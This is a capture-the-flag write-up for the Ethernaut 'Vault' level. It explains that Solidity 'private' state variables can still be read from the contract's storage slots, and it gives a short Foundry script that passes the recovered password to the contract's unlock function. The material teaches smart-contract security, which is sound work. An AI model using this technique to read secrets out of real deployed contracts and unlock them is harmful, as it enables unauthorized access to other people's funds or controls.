---
layout: writeup
title: "Vault"
level: "Intermediate"
category: "Ethernaut"
description: "Unlock a vault by reading 'private' storage data directly from the blockchain."
---

## Analysis

The `Vault` contract is locked and requires a `password` to open. The password is stored as a `private` variable:
`bytes32 private password;`

**The Flaw:**
In Solidity, the `private` keyword only prevents **other contracts** from reading the variable. It does not hide the data from the outside world. All state variables are stored in **Storage Slots** (32-byte chunks). 



---

## Solution

The level is solved by reading the password directly from the Vault contract’s storage and passing it to the unlock function using a Foundry script. The exploit script retrieves the value stored in slot 1 off-chain and supplies it as an argument to unlock, setting the locked state to false and completing the level. No additional attacker contract deployment is required.

---

**Exploit Script (Foundry):**

<pre class="plain-code"><code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IVault {
    function unlock(bytes32 _password) external;
    function locked() external view returns (bool);
}

contract UnlockVaultScript is Script {
    function run() external {
        // read instance address from env
        address target = vm.envAddress("INSTANCE_ADDRESS");

        // read password from env as bytes32
        bytes32 pw = vm.envBytes32("PASSWORD_HEX");

        // start broadcast using --private-key CLI flag
        vm.startBroadcast();

        IVault(target).unlock(pw);

        vm.stopBroadcast();
    }
}

</code></pre>

---